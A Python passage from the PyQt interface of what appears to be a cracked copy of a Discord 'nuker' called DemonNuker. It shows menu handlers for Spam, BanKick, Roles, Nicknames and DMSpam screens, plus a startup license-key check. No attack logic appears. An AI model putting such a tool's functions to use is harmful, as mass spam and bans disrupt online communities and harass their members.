        serverinfo = ServerInfo()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Channels(self):
        channels = Channels()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def BanKick(self):
        channels = BanKick()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Spam(self):
        channels = Spam()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)
    
    def Roles(self):
        channels = Roles()
        widget.addWidget(channels)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menunicknames(self):
        serverinfo = Nicknames()
        widget.addWidget(serverinfo)
        widget.setCurrentIndex(widget.currentIndex()+1)

    def menudmspam(self):
        dmspam = DMSpam()
        widget.addWidget(dmspam)
        widget.setCurrentIndex(widget.currentIndex()+1)


#Main

os.environ["QT_AUTO_SCREEN_SCALE_FACTOR"] = "1"
app = QApplication([])
app.setWindowIcon(QIcon(f"{os.getenv('localappdata')}\\DemonNuker - Full Cracked by Cabbo\\.png"))
widget = QStackedWidget()

key_r = open(f"{os.getenv('localappdata')}/DemonNuker - Full Cracked by Cabbo/key.data", "r").read()


key = decrypt(key_r)

gg = checkkey(key)
if gg:
    mainwindow = Login()
else:
    mainwindow = Main()
widget.addWidget(mainwindow)
widget.setFixedSize(700, 360)
widget.show()



app.exec_()